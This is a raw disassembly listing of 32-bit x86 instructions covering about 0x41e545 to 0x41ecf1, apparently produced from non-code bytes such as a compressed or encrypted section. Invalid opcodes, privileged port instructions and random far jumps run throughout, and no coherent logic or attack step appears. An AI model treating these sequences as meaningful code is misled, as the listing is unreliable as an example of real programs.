  41e545:	aam    0x68
  41e547:	pushf  
  41e548:	xchg   ebx,eax
  41e549:	xchg   DWORD PTR [edi+edi*4-0x111cd9a],edi
  41e550:	mov    al,ds:0xc9c022fd
  41e555:	enter  0x7bc1,0x58
  41e559:	mov    ebp,0x34de5ebe
  41e55e:	jl     0x41e5bb
  41e560:	(bad)  
  41e561:	mov    dl,0x7
  41e563:	or     eax,0xb599a80d
  41e568:	and    eax,0xd04fb6ba
  41e56d:	dec    ebx
  41e56e:	add    ah,dh
  41e570:	out    dx,eax
  41e571:	jmp    0xbf40:0x961d0271
  41e578:	sbb    BYTE PTR [eax-0x1f14b97d],0x20
  41e57f:	sbb    DWORD PTR [ebx-0x1f377850],ecx
  41e585:	shr    edx,0x12
  41e588:	aaa    
  41e589:	addr16 jle 0x41e5a1
  41e58c:	inc    esp
  41e58d:	rcl    eax,0x9
  41e590:	mov    dh,0x24
  41e592:	fwait
  41e593:	push   0x35
  41e595:	pushfw 
  41e597:	in     eax,0xfa
  41e599:	dec    ebp
  41e59a:	lahf   
  41e59b:	fwait
  41e59c:	out    0xa9,eax
  41e59e:	mov    eax,0xd3864c73
  41e5a3:	jecxz  0x41e5b6
  41e5a5:	(bad)  
  41e5a6:	jle    0x41e58a
  41e5a8:	call   0xcba3:0xf52dabca
  41e5af:	xchg   ebp,eax
  41e5b0:	and    ebp,edx
  41e5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5b3:	in     al,dx
  41e5b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5b5:	pop    edx
  41e5b6:	add    eax,0x4f3b4300
  41e5bb:	mov    edi,0x591a8721
  41e5c0:	les    edi,FWORD PTR [ecx]
  41e5c2:	pop    es
  41e5c3:	inc    eax
  41e5c4:	cld    
  41e5c5:	cmp    al,0x13
  41e5c7:	icebp  
  41e5c8:	inc    esp
  41e5c9:	in     eax,0x6f
  41e5cb:	sub    dh,dh
  41e5cd:	stc    
  41e5ce:	and    dh,BYTE PTR [edx]
  41e5d0:	cdq    
  41e5d1:	out    dx,eax
  41e5d2:	mov    esi,0xef861a10
  41e5d7:	mov    edi,0x7d5d9e92
  41e5dc:	lock (bad) 
  41e5de:	out    dx,al
  41e5df:	lods   al,BYTE PTR ds:[esi]
  41e5e0:	mov    edx,0xe1aa9f88
  41e5e5:	xchg   edi,eax
  41e5e6:	push   0x1f
  41e5e8:	sbb    DWORD PTR [ebp+0x29e07650],edx
  41e5ee:	cdq    
  41e5ef:	mov    bl,BYTE PTR [ebp+0x6a782e2e]
  41e5f5:	sbb    al,0xc5
  41e5f7:	or     DWORD PTR [ecx-0x33432557],edi
  41e5fd:	imul   ebx,DWORD PTR [edi-0x11],0x11
  41e601:	mov    eax,ds:0xa051b5f3
  41e606:	push   ebx
  41e607:	add    DWORD PTR [esi-0x4aca1768],0xffffffa5
  41e60e:	mov    eax,ds:0x94bf8f93
  41e613:	test   eax,0x11b73714
  41e618:	and    al,0x1d
  41e61a:	dec    edx
  41e61b:	rcr    DWORD PTR [eax-0x7f3c1a54],cl
  41e621:	ja     0x41e5b7
  41e623:	mov    esi,0xb4967f5b
  41e628:	fnstenv ss:[ecx+0x5a9ccf76]
  41e62f:	fistp  QWORD PTR [edi+0x46ec4e7e]
  41e635:	clc    
  41e636:	xor    ch,bl
  41e638:	sahf   
  41e639:	retf   
  41e63a:	push   ss
  41e63b:	mov    al,ds:0x23f1732
  41e640:	sbb    ecx,DWORD PTR [esi+0x53]
  41e643:	push   eax
  41e644:	aad    0xf5
  41e646:	xchg   BYTE PTR [edi+0x22],dh
  41e649:	xor    eax,0x8ba088ff
  41e64e:	sub    al,0x72
  41e650:	pop    ebx
  41e651:	or     al,0x9a
  41e653:	adc    ebp,ecx
  41e655:	into   
  41e656:	outs   dx,DWORD PTR ds:[esi]
  41e657:	sub    eax,0xfb6f88a2
  41e65c:	cmp    esi,DWORD PTR [edx]
  41e65e:	out    dx,al
  41e65f:	mov    dl,0x2b
  41e661:	dec    esp
  41e662:	mov    dl,0x2f
  41e664:	push   ecx
  41e665:	out    dx,eax
  41e666:	js     0x41e6d1
  41e668:	mov    dh,0x25
  41e66a:	into   
  41e66b:	mov    edi,ebp
  41e66d:	xor    dh,BYTE PTR [eax-0x7bd377c4]
  41e673:	or     al,BYTE PTR [esi-0x65b00b6d]
  41e679:	jl     0x41e62d
  41e67b:	imul   BYTE PTR [esi-0x47]
  41e67e:	jo     0x41e68d
  41e680:	pop    esi
  41e681:	aam    0x97
  41e683:	and    ebx,ecx
  41e685:	inc    eax
  41e686:	cmp    eax,0xf9953bf9
  41e68b:	rcl    bl,0x37
  41e68e:	ja     0x41e687
  41e690:	inc    eax
  41e691:	mov    ch,0xb6
  41e693:	push   esp
  41e694:	aad    0x58
  41e696:	mov    al,ds:0x585b8238
  41e69b:	aam    0xa5
  41e69d:	fcomi  st,st(7)
  41e69f:	add    al,0x4
  41e6a1:	mov    bh,0x5d
  41e6a3:	sub    ebx,edx
  41e6a5:	pusha  
  41e6a6:	(bad)  
  41e6a7:	stc    
  41e6a8:	xchg   ecx,eax
  41e6a9:	fimul  DWORD PTR ds:0x619efb26
  41e6af:	imul   ecx,DWORD PTR [ecx-0x17],0xfffffffe
  41e6b3:	xchg   edi,eax
  41e6b4:	jo     0x41e66e
  41e6b6:	mov    bh,0x9c
  41e6b8:	in     eax,dx
  41e6b9:	shr    DWORD PTR [eax+0x34a76860],cl
  41e6bf:	mov    WORD PTR [edx-0x69],es
  41e6c2:	aad    0x95
  41e6c4:	clc    
  41e6c5:	lock mov esi,0xf3600bd
  41e6cb:	sahf   
  41e6cc:	push   esi
  41e6cd:	hlt    
  41e6ce:	test   BYTE PTR [ebx+0x589fc5c0],bl
  41e6d4:	fistp  DWORD PTR [ecx-0x73a2fae7]
  41e6da:	xchg   esp,eax
  41e6db:	lods   al,BYTE PTR ds:[esi]
  41e6dc:	sub    dl,bl
  41e6de:	call   0x5685:0xaade4643
  41e6e5:	add    BYTE PTR [esi+0x7e88bcb1],bl
  41e6eb:	or     al,BYTE PTR ds:0x44cdbabd
  41e6f1:	into   
  41e6f2:	xchg   ebx,eax
  41e6f3:	dec    esp
  41e6f4:	cmp    BYTE PTR [edx],ah
  41e6f6:	sahf   
  41e6f7:	sahf   
  41e6f8:	(bad)  
  41e6f9:	call   0x4def:0x4f3950d0
  41e700:	loop   0x41e6c8
  41e702:	mov    dh,0x78
  41e704:	rcl    dl,1
  41e706:	mov    ds:0xcf4aecb6,eax
  41e70b:	pop    eax
  41e70c:	loopne 0x41e6e8
  41e70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e70f:	enter  0xc10e,0xe5
  41e713:	mov    eax,0x3ebfd632
  41e718:	adc    ebp,DWORD PTR [ebx]
  41e71a:	jb     0x41e6bd
  41e71c:	and    eax,0x6c54c98b
  41e721:	xchg   esp,eax
  41e722:	add    al,0xb1
  41e724:	mov    ch,0x4b
  41e726:	gs mov edx,0x50a752b
  41e72c:	les    edi,FWORD PTR [edi+0x51]
  41e72f:	outs   dx,BYTE PTR ds:[esi]
  41e730:	or     dl,0x77
  41e733:	pop    esi
  41e734:	or     DWORD PTR ds:0xe07ebb3d,eax
  41e73a:	in     al,dx
  41e73b:	arpl   WORD PTR [edx-0x4d],si
  41e73e:	inc    eax
  41e73f:	add    cl,BYTE PTR [eax+0x47]
  41e742:	mov    dl,0xd0
  41e744:	push   0x18
  41e746:	inc    edi
  41e747:	jle    0x41e72a
  41e749:	dec    esp
  41e74a:	push   esp
  41e74b:	cmp    eax,0x8cb33b8f
  41e750:	gs ror edi,cl
  41e753:	fs out 0x6,eax
  41e756:	jne    0x41e7d2
  41e758:	mov    eax,0x3e14dedd
  41e75d:	lods   eax,DWORD PTR ds:[esi]
  41e75e:	xor    bl,BYTE PTR [ebx+0x4b0c1235]
  41e764:	adc    dl,ch
  41e766:	mov    fs,WORD PTR [ecx+0x68]
  41e769:	mov    ch,0x25
  41e76b:	out    0x80,eax
  41e76d:	(bad)  
  41e76e:	fnsave [ecx-0x36ff8f2c]
  41e774:	dec    ebx
  41e775:	sub    BYTE PTR [esi-0x3fd43004],cl
  41e77b:	mov    dl,0xe6
  41e77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e77e:	movzx  edx,bx
  41e781:	and    bl,BYTE PTR [ebx-0x6d]
  41e784:	mov    ebp,0x6c7834de
  41e789:	jmp    0x1af7:0xd4b8f8ee
  41e790:	lods   eax,DWORD PTR ds:[esi]
  41e791:	mov    cl,0xae
  41e793:	mov    ebx,DWORD PTR [eax*8+0x1d2203d7]
  41e79a:	(bad)
  41e79f:	mov    esi,0x5310485
  41e7a4:	inc    esp
  41e7a5:	lahf   
  41e7a6:	sar    DWORD PTR [edx+0x13c1d839],1
  41e7ac:	aaa    
  41e7ad:	mov    ds:0x5f05ccfc,eax
  41e7b2:	adc    edx,DWORD PTR [edi]
  41e7b4:	mov    ebp,0xe7a37170
  41e7b9:	call   0x9bec:0x5e00a42d
  41e7c0:	mov    DWORD PTR [esi],eax
  41e7c2:	jmp    0x41e7c2
  41e7c4:	mov    ch,0xb7
  41e7c6:	icebp  
  41e7c7:	jmp    0x566e4e69
  41e7cc:	sub    esp,DWORD PTR [edx+0x4b08a16f]
  41e7d2:	or     al,0xec
  41e7d4:	in     eax,0x9
  41e7d6:	call   0x2c67:0xf93061d4
  41e7dd:	and    BYTE PTR [ecx],0x15
  41e7e0:	inc    edx
  41e7e1:	pop    ds
  41e7e2:	sbb    edx,DWORD PTR [eax+0x7f]
  41e7e5:	dec    edi
  41e7e6:	jl     0x41e83b
  41e7e8:	mov    ds,edi
  41e7ea:	xchg   ecx,eax
  41e7eb:	xchg   esp,eax
  41e7ec:	enter  0xc227,0x67
  41e7f0:	leave  
  41e7f1:	call   0xc873:0xb227a47
  41e7f8:	add    eax,esp
  41e7fa:	addr16 push esi
  41e7fc:	nop
  41e7fd:	sar    DWORD PTR [edx-0x21],cl
  41e800:	scas   al,BYTE PTR es:[edi]
  41e801:	cmp    edi,DWORD PTR [eax]
  41e803:	mov    ebp,0x7b1191e3
  41e808:	cld    
  41e809:	add    eax,DWORD PTR [edi-0x1f]
  41e80c:	aas    
  41e80d:	icebp  
  41e80e:	test   BYTE PTR [ecx-0x4a31641],0x88
  41e815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e816:	sub    eax,0x2fb7f706
  41e81b:	ins    DWORD PTR es:[edi],dx
  41e81c:	xlat   BYTE PTR ds:[ebx]
  41e81d:	call   0x9125c5d6
  41e822:	stos   BYTE PTR es:[edi],al
  41e823:	cmc    
  41e824:	out    dx,al
  41e825:	int3   
  41e826:	mov    gs,WORD PTR [ebp+0x3c]
  41e829:	push   ecx
  41e82a:	pop    es
  41e82b:	jl     0x41e890
  41e82d:	push   esp
  41e82e:	rcr    BYTE PTR [esi-0x4369280b],1
  41e834:	lea    esi,[ebx+edi*8+0x2a]
  41e838:	mov    edx,0x9a81c07d
  41e83d:	loopne 0x41e8bd
  41e83f:	dec    edx
  41e840:	mov    cl,BYTE PTR [edx]
  41e842:	int3   
  41e843:	mov    ebp,0xfbda9b4c
  41e848:	xor    esi,ebx
  41e84a:	add    eax,0x68d3482
  41e84f:	jne    0x41e842
  41e851:	ficom  DWORD PTR [eax]
  41e853:	inc    ebx
  41e854:	inc    ecx
  41e855:	sbb    ah,ch
  41e857:	add    BYTE PTR [edx],bh
  41e859:	loopne 0x41e898
  41e85b:	arpl   si,di
  41e85d:	inc    DWORD PTR [edi]
  41e85f:	sub    eax,0x444fd29c
  41e864:	add    BYTE PTR [ebp+0x75],ch
  41e867:	cmp    ah,ah
  41e869:	jg     0x41e88d
  41e86b:	add    ebx,eax
  41e86d:	sub    esi,DWORD PTR [edi]
  41e86f:	out    0x21,eax
  41e871:	inc    edi
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	retf   0x5ca
  41e876:	xor    ebx,DWORD PTR [ecx-0x4b]
  41e879:	enter  0x3739,0x85
  41e87d:	or     esp,eax
  41e87f:	pop    ss
  41e880:	scas   al,BYTE PTR es:[edi]
  41e881:	cld    
  41e882:	mov    ds:0x4320149,al
  41e887:	repnz xchg edx,eax
  41e889:	jg     0x41e8b9
  41e88b:	les    esp,FWORD PTR [esi-0xd]
  41e88e:	repz pop ss
  41e890:	mov    esi,0x7df2cf4d
  41e895:	popa   
  41e896:	pop    ss
  41e897:	sbb    esi,ecx
  41e899:	dec    ecx
  41e89a:	scas   al,BYTE PTR es:[edi]
  41e89b:	rol    BYTE PTR [edi-0x6e7b40f4],1
  41e8a1:	and    BYTE PTR ds:0xc9c56c3d,bh
  41e8a7:	dec    ecx
  41e8a8:	addr16 add dh,al
  41e8ab:	test   DWORD PTR [ebx],esp
  41e8ad:	scas   eax,DWORD PTR es:[edi]
  41e8ae:	and    al,0x74
  41e8b0:	jl     0x41e86d
  41e8b2:	call   0xe591:0xad01b2da
  41e8b9:	lahf   
  41e8ba:	inc    edx
  41e8bb:	mov    ebx,0xf5a66363
  41e8c0:	retf   0x76d2
  41e8c3:	cmp    BYTE PTR [ebx-0x3079dfa8],al
  41e8c9:	mov    ecx,0xeb9c67ea
  41e8ce:	pop    ebp
  41e8cf:	sbb    DWORD PTR [edx+0x3c],ecx
  41e8d2:	mov    ch,0x73
  41e8d4:	call   0x7f987393
  41e8d9:	xor    al,BYTE PTR [edi+0x8]
  41e8dc:	fs ret 0x3b00
  41e8e0:	icebp  
  41e8e1:	sbb    dh,bh
  41e8e3:	cmp    DWORD PTR [ecx-0x6f],0x660874f2
  41e8ea:	pop    edx
  41e8eb:	sahf   
  41e8ec:	fadd   QWORD PTR [esi+0x2a]
  41e8ef:	sub    esp,ebp
  41e8f1:	mov    eax,0x40b214f4
  41e8f6:	test   BYTE PTR gs:[ebp+0x60cbb6d8],cl
  41e8fd:	pop    esp
  41e8fe:	out    0xb3,eax
  41e900:	push   edi
  41e901:	add    dl,0xc3
  41e904:	add    BYTE PTR [ebx],dl
  41e906:	pushf  
  41e907:	jge    0x41e8f5
  41e909:	push   esi
  41e90a:	xchg   dh,dh
  41e90c:	xor    cl,bl
  41e90e:	sub    eax,0x2e536b90
  41e913:	xor    eax,0xe61b0171
  41e918:	dec    edi
  41e919:	push   0xfffffff2
  41e91b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e91c:	cmc    
  41e91d:	mov    cl,0x8b
  41e91f:	out    0x85,eax
  41e921:	jmp    0x41e994
  41e923:	popa   
  41e924:	mov    ecx,DWORD PTR [edx-0x6e]
  41e927:	neg    dh
  41e929:	push   ebp
  41e92a:	jmp    0x756d2b0c
  41e92f:	aas    
  41e930:	call   0xb840:0xe0cd89be
  41e937:	xchg   dl,ch
  41e939:	or     DWORD PTR [edx-0x52],edx
  41e93c:	push   esi
  41e93d:	and    BYTE PTR [ecx-0x4c],ah
  41e940:	cli    
  41e941:	je     0x41e91b
  41e943:	push   ss
  41e944:	cdq    
  41e945:	test   eax,0x2a1f7769
  41e94a:	push   esi
  41e94b:	hlt    
  41e94c:	or     BYTE PTR [ecx-0x2c],dl
  41e94f:	xchg   BYTE PTR [edx+0x7a],al
  41e952:	cmp    al,0x25
  41e954:	xor    ecx,DWORD PTR [eax+0x44a222d3]
  41e95a:	xor    DWORD PTR [esp+esi*2-0x9],ebp
  41e95e:	jg     0x41e9c4
  41e960:	adc    eax,DWORD PTR ss:[edx+0x39]
  41e964:	sets   BYTE PTR [esi+edx*8+0x3d]
  41e969:	hlt    
  41e96a:	add    al,0x1
  41e96c:	rol    dh,cl
  41e96e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e96f:	ss sub edi,edi
  41e972:	mov    ecx,DWORD PTR [ecx]
  41e974:	loope  0x41e941
  41e976:	dec    ecx
  41e977:	xchg   edi,eax
  41e978:	jmp    0xd9dddd83
  41e97d:	jmp    0x41e995
  41e97f:	mov    eax,0x740d52af
  41e984:	add    bl,BYTE PTR [edx]
  41e986:	ret    0xa7c1
  41e989:	imul   ecx,DWORD PTR [ebp+0x64],0x8bb94578
  41e990:	dec    esi
  41e991:	arpl   WORD PTR [edx+0x5e055ee3],dx
  41e997:	jg     0x41e949
  41e999:	pop    ecx
  41e99a:	xor    ch,dh
  41e99c:	loopne 0x41e9ac
  41e99e:	mov    ebp,0x8925aa04
  41e9a3:	mov    esp,ds
  41e9a5:	in     eax,dx
  41e9a6:	jo     0x41ea13
  41e9a8:	add    al,0xef
  41e9aa:	adc    al,0x1c
  41e9ac:	shl    BYTE PTR [edx],cl
  41e9ae:	lahf   
  41e9af:	cli    
  41e9b0:	neg    BYTE PTR [edx-0x6c]
  41e9b3:	pusha  
  41e9b4:	inc    eax
  41e9b5:	push   ecx
  41e9b6:	ja     0x41ea36
  41e9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9b9:	das    
  41e9ba:	xor    DWORD PTR [edi+ebx*2-0x247fd571],0xffffff82
  41e9c2:	jmp    ecx
  41e9c4:	pusha  
  41e9c5:	dec    edx
  41e9c6:	jns    0x41e999
  41e9c8:	xor    al,0x6e
  41e9ca:	sub    bh,al
  41e9cc:	fst    QWORD PTR [ecx]
  41e9ce:	sbb    eax,0xee9c9120
  41e9d3:	ss mov ?,edi
  41e9d6:	rol    DWORD PTR [bx+si-0x11],cl
  41e9da:	jg     0x41e968
  41e9dc:	rcr    BYTE PTR [edx+0x2a9973da],cl
  41e9e2:	or     DWORD PTR [eax+0x631dac0d],ebp
  41e9e8:	or     DWORD PTR ss:[edi+0x56ae9298],ebp
  41e9ef:	fidiv  WORD PTR [ebp-0x64]
  41e9f2:	xchg   ebp,eax
  41e9f3:	xchg   edx,eax
  41e9f4:	cmp    bh,BYTE PTR [edi]
  41e9f6:	or     dl,BYTE PTR [ecx+ebx*2-0x18]
  41e9fa:	cmp    bx,0x7f
  41e9fe:	sti    
  41e9ff:	adc    al,0x75
  41ea01:	popf   
  41ea02:	ins    BYTE PTR es:[edi],dx
  41ea03:	push   0x41
  41ea05:	and    DWORD PTR [ecx-0x2d],edx
  41ea08:	dec    esp
  41ea09:	mov    ebp,0x443a0f56
  41ea0e:	bound  ecx,QWORD PTR [edx-0x2d]
  41ea11:	scas   al,BYTE PTR es:[edi]
  41ea12:	cwde   
  41ea13:	xlat   BYTE PTR ds:[ebx]
  41ea14:	adc    cl,bl
  41ea16:	push   ecx
  41ea17:	push   ecx
  41ea18:	push   ebx
  41ea19:	push   ebx
  41ea1a:	es inc ecx
  41ea1c:	jmp    0x2e01e1a8
  41ea21:	mov    ebp,0xc8bfed22
  41ea26:	jp     0x41ea64
  41ea28:	bound  edx,QWORD PTR [ecx+0x46]
  41ea2b:	jge    0x41ea00
  41ea2d:	fs jge 0x41eaa8
  41ea30:	out    0xc5,al
  41ea32:	mov    ah,0x33
  41ea34:	inc    eax
  41ea35:	cmp    al,0x63
  41ea37:	hlt    
  41ea38:	add    ebp,ebp
  41ea3a:	xor    eax,0x9a14bad5
  41ea3f:	xchg   edi,eax
  41ea40:	jae    0x41e9c9
  41ea42:	leave  
  41ea43:	test   al,0xc0
  41ea45:	daa    
  41ea46:	and    esi,DWORD PTR [esi+0x49]
  41ea49:	xor    eax,0x2bf0723a
  41ea4e:	outs   dx,BYTE PTR ds:[esi]
  41ea4f:	ds push esp
  41ea51:	mov    cl,0xff
  41ea53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea54:	fdiv   QWORD PTR [edi-0x69]
  41ea57:	rcl    BYTE PTR [edx],0xfd
  41ea5a:	div    DWORD PTR [esi+edi*2]
  41ea5d:	sbb    ah,BYTE PTR [ebx-0x70]
  41ea60:	jae    0x41ea67
  41ea62:	xor    ch,bl
  41ea64:	sbb    eax,DWORD PTR [eax+0x8a09fbb]
  41ea6a:	pusha  
  41ea6b:	pusha  
  41ea6c:	and    al,BYTE PTR [esi-0x37]
  41ea6f:	jae    0x41ea9f
  41ea71:	cmp    al,0xfa
  41ea73:	add    ebp,DWORD PTR [ebp+edi*1-0x1e3c80e5]
  41ea7a:	dec    edi
  41ea7b:	pop    es
  41ea7c:	frstor [eax+0x59]
  41ea7f:	fisub  WORD PTR [edi]
  41ea81:	js     0x41ea3e
  41ea83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea84:	dec    edx
  41ea85:	es mov dl,0x7a
  41ea88:	mov    ebp,0x7d199aac
  41ea8d:	call   0xdfcc:0x1f00068b
  41ea94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea95:	add    eax,0xa55f048a
  41ea9a:	out    0x7b,al
  41ea9c:	dec    esi
  41ea9d:	and    BYTE PTR [ebx],dl
  41ea9f:	or     BYTE PTR [ebx-0x7092c891],dh
  41eaa5:	mov    dh,0x54
  41eaa7:	ror    esp,cl
  41eaa9:	lahf   
  41eaaa:	rcl    DWORD PTR [esi-0x2e],cl
  41eaad:	jp     0x41eaf5
  41eaaf:	dec    edi
  41eab0:	xchg   DWORD PTR [esi],edx
  41eab2:	mov    ecx,0xbfcdf40b
  41eab7:	or     al,BYTE PTR [ebx+0x2]
  41eaba:	popf   
  41eabb:	push   0x5a1a0a29
  41eac0:	push   0xffffffee
  41eac2:	mov    edx,0x36c60f51
  41eac7:	in     eax,dx
  41eac8:	std    
  41eac9:	icebp  
  41eaca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eacb:	out    dx,eax
  41eacc:	adc    DWORD PTR [eax+0x58],ebp
  41eacf:	mov    ebp,0xeb47def0
  41ead4:	jmp    0x5b0f:0xa9891b12
  41eadb:	sub    al,0x8b
  41eadd:	push   ecx
  41eade:	(bad)  
  41eadf:	je     0x41eb2d
  41eae1:	(bad)  [esi-0x18]
  41eae4:	pop    DWORD PTR [ebx+edx*2]
  41eae7:	adc    al,0xd0
  41eae9:	iret   
  41eaea:	repnz repnz sub DWORD PTR [esi],0x3b41404c
  41eaf2:	gs ret 0x71e5
  41eaf6:	push   esi
  41eaf7:	sar    esp,cl
  41eaf9:	call   0x5475fb05
  41eafe:	xlat   BYTE PTR ds:[ebx]
  41eaff:	mov    ebx,0x1b418cda
  41eb04:	retf   0xaf62
  41eb07:	cli    
  41eb08:	fild   QWORD PTR [edi-0x3a951d69]
  41eb0e:	add    eax,0xdef2654b
  41eb13:	sbb    eax,0xa2490ae7
  41eb18:	xchg   BYTE PTR [esi+0x12f326cd],dl
  41eb1e:	sbb    eax,0x16c2e19d
  41eb23:	ret    0x1068
  41eb26:	sbb    ebp,edi
  41eb28:	(bad)  
  41eb2a:	push   cs
  41eb2b:	sahf   
  41eb2c:	stos   DWORD PTR es:[edi],eax
  41eb2d:	xchg   edi,eax
  41eb2e:	inc    ebp
  41eb2f:	call   0x25b3:0x4ead01ba
  41eb36:	or     DWORD PTR [ebx],0x46665358
  41eb3c:	mul    BYTE PTR [ecx+0x37]
  41eb3f:	xor    dl,BYTE PTR ds:[edx]
  41eb42:	xchg   esp,eax
  41eb43:	push   DWORD PTR [edx+0x60d81957]
  41eb49:	(bad)  
  41eb4a:	push   ecx
  41eb4b:	cli    
  41eb4c:	stos   BYTE PTR es:[edi],al
  41eb4d:	es push esi
  41eb4f:	adc    eax,0xbcadee9f
  41eb54:	mov    ah,0x47
  41eb56:	out    dx,eax
  41eb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb58:	pop    ds
  41eb59:	sub    ah,ch
  41eb5b:	in     al,dx
  41eb5c:	or     al,0xbd
  41eb5e:	enter  0x6289,0x29
  41eb62:	cmp    al,0xc9
  41eb64:	sbb    al,0xa4
  41eb66:	pop    esi
  41eb67:	fs sbb al,0xa1
  41eb6a:	cwde   
  41eb6b:	dec    eax
  41eb6c:	stos   DWORD PTR es:[edi],eax
  41eb6d:	and    DWORD PTR [ecx+0x2c8ca47a],edx
  41eb73:	out    dx,eax
  41eb74:	icebp  
  41eb75:	cmp    esp,DWORD PTR [edx-0x4acf83e6]
  41eb7b:	mov    esi,0x291e5557
  41eb80:	and    eax,0x12f751c9
  41eb85:	pop    es
  41eb86:	sub    BYTE PTR [ecx],ah
  41eb88:	fsub   QWORD PTR ds:0x9f814c18
  41eb8e:	dec    ebx
  41eb8f:	(bad)  
  41eb90:	fdivr  QWORD PTR [edx-0x37]
  41eb93:	mov    edx,0x8c701e23
  41eb98:	or     ecx,DWORD PTR [edx+0x6f3b3f68]
  41eb9e:	mov    bh,0x1e
  41eba0:	sub    esi,DWORD PTR [edx]
  41eba2:	in     al,dx
  41eba3:	mov    ecx,DWORD PTR [edx+edx*4]
  41eba6:	xchg   esi,eax
  41eba7:	pushf  
  41eba8:	inc    edx
  41eba9:	test   eax,0x7bd0125
  41ebae:	test   DWORD PTR [ebx+0x5fbbd209],0x96109699
  41ebb8:	sub    ecx,0x156abe57
  41ebbe:	sbb    edi,ebp
  41ebc0:	or     ecx,edx
  41ebc2:	fild   QWORD PTR [edi-0x2e]
  41ebc5:	xchg   ebp,eax
  41ebc6:	fst    QWORD PTR [ebp-0x367ffd0d]
  41ebcc:	shl    DWORD PTR [ecx-0x7923f5e1],0xb6
  41ebd3:	mov    WORD PTR [edi-0x42],ds
  41ebd6:	xchg   esi,eax
  41ebd7:	lahf   
  41ebd8:	loop   0x41ebb1
  41ebda:	mul    BYTE PTR [edx-0x6]
  41ebdd:	fisttp DWORD PTR [esp+ebp*8-0x47]
  41ebe1:	jge    0x41ebe2
  41ebe3:	xchg   esp,eax
  41ebe4:	shl    BYTE PTR es:[edi],0x58
  41ebe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebe9:	xchg   edi,eax
  41ebea:	ins    DWORD PTR es:[edi],dx
  41ebeb:	addr16 (bad) 
  41ebed:	les    esi,FWORD PTR [ebp+0x5d]
  41ebf0:	jne    0x41ec3d
  41ebf2:	call   0xfb04:0x82fef218
  41ebf9:	and    al,0x75
  41ebfb:	pop    es
  41ebfc:	clc    
  41ebfd:	inc    ecx
  41ebfe:	or     ebp,DWORD PTR [ecx+ebx*8]
  41ec01:	jecxz  0x41ebee
  41ec03:	cmp    BYTE PTR [eax+0x23],ch
  41ec06:	(bad)
  41ec09:	loop   0x41ec7b
  41ec0b:	mov    ds:0x572699dd,al
  41ec10:	(bad)  
  41ec11:	cmp    esi,DWORD PTR [esi-0x4a7192b8]
  41ec17:	mov    bl,0x78
  41ec19:	mov    dh,0x35
  41ec1b:	rol    DWORD PTR [esp+edx*2-0x7389bc98],1
  41ec22:	xchg   esi,eax
  41ec23:	mov    al,0x58
  41ec25:	xor    eax,0x1bed7108
  41ec2a:	xor    edx,esi
  41ec2c:	and    esp,eax
  41ec2e:	push   esi
  41ec2f:	push   0xffffffe2
  41ec31:	out    0x6a,al
  41ec33:	mov    DWORD PTR [edi-0x3c],ecx
  41ec36:	dec    edi
  41ec37:	push   0xffffffbe
  41ec39:	inc    ebp
  41ec3a:	jle    0x41ebd6
  41ec3c:	in     eax,0xd9
  41ec3e:	imul   esi,DWORD PTR [ebp+0x4c67177d],0x29
  41ec45:	jne    0x41eca4
  41ec47:	ins    DWORD PTR es:[edi],dx
  41ec48:	shl    WORD PTR [ebp+0x29],0xf
  41ec4d:	mov    ds:0x7eec314a,eax
  41ec52:	ret    0x87ca
  41ec55:	inc    esi
  41ec56:	jl     0x41ec20
  41ec58:	jecxz  0x41ecb5
  41ec5a:	(bad)  
  41ec5b:	(bad)  [ecx-0x72]
  41ec5e:	or     al,0xc6
  41ec60:	(bad)  
  41ec62:	sar    BYTE PTR [ebp-0x68a3fb99],cl
  41ec68:	mov    dh,0xef
  41ec6a:	cmp    BYTE PTR [ecx+0x3d6065f5],bh
  41ec70:	ss mov cl,0xe4
  41ec73:	pop    ecx
  41ec74:	(bad)  
  41ec75:	jmp    0x3924:0x32c07069
  41ec7c:	sti    
  41ec7d:	sbb    eax,0xdf56c05e
  41ec82:	push   es
  41ec83:	out    0x65,al
  41ec85:	inc    ebx
  41ec86:	xor    bl,al
  41ec88:	xchg   ecx,eax
  41ec89:	pop    eax
  41ec8a:	loopne 0x41ec93
  41ec8c:	(bad)  
  41ec8d:	mov    ebp,0x33d71c90
  41ec92:	sbb    al,0xff
  41ec94:	adc    ch,BYTE PTR [edx]
  41ec96:	inc    esi
  41ec97:	push   cs
  41ec98:	mov    bh,0xee
  41ec9a:	int3   
  41ec9b:	repnz mov ds:0x66e589a,al
  41eca1:	push   edi
  41eca2:	lods   al,BYTE PTR ds:[esi]
  41eca3:	jecxz  0x41ed0c
  41eca5:	je     0x41ec7f
  41eca7:	inc    esp
  41eca8:	and    ah,BYTE PTR [esi+0x64]
  41ecab:	mov    ecx,0x8961a300
  41ecb0:	sub    al,0xe
  41ecb2:	xor    eax,ebp
  41ecb4:	cli    
  41ecb5:	adc    cl,BYTE PTR [eax+0x20]
  41ecb8:	cld    
  41ecb9:	pusha  
  41ecba:	retf   0x4e48
  41ecbd:	ficomp WORD PTR [ecx-0x55598d2e]
  41ecc3:	xchg   bh,ch
  41ecc5:	jp     0x41ed24
  41ecc7:	imul   eax,DWORD PTR [edx+0x5877bd02],0xffffffc6
  41ecce:	cmc    
  41eccf:	cmp    ebp,ebx
  41ecd1:	sbb    al,0x5d
  41ecd3:	jne    0x41ec94
  41ecd5:	pop    esi
  41ecd6:	(bad)  
  41ecd7:	jne    0x41ec91
  41ecd9:	push   0xfcd74a7c
  41ecde:	or     BYTE PTR [edx+eax*2-0x4924ae7f],0x50
  41ece6:	jle    0x41ece6
  41ece8:	cmc    
  41ece9:	cwde   
  41ecea:	adc    cl,BYTE PTR [edi-0x1e93941d]
  41ecf0:	pop    ebp
  41ecf1:	cli    
